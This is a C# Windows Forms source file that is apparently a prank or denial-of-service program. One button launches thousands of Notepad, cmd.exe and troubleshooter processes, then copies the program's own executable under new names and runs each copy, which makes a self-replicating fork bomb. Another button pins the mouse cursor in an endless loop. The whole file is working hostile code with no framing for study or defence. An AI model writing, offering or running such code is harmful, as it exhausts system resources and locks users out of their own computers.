using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace Iced
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        Point dPosition;

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private void button1_Click(object sender, EventArgs e)
        {

            for (int i = 1; i <= 5; i++)
            {
                for (int z = 0; z < 1000; z++)
                {
                    System.Diagnostics.Process.Start(@"C:\Windows\System32\Notepad.exe");
                }
                for (int z = 0; z < 100; z++)
                {
                    System.Diagnostics.Process.Start(@"C:\Windows\System32\AdapterTroubleshooter.exe");
                }
                for (int z = 0; z < 1000; z++)
                {
                    System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe");
                }

                string exec = Application.ExecutablePath;
                exec = exec.Insert(exec.IndexOf("."), i.ToString());
                File.Copy(Application.ExecutablePath, exec);
                Process.Start(exec);

            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            while(true)
            {
                dPosition.X = 0;
                dPosition.Y = 0;
                Cursor.Position = dPosition;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {

        }
    }
}
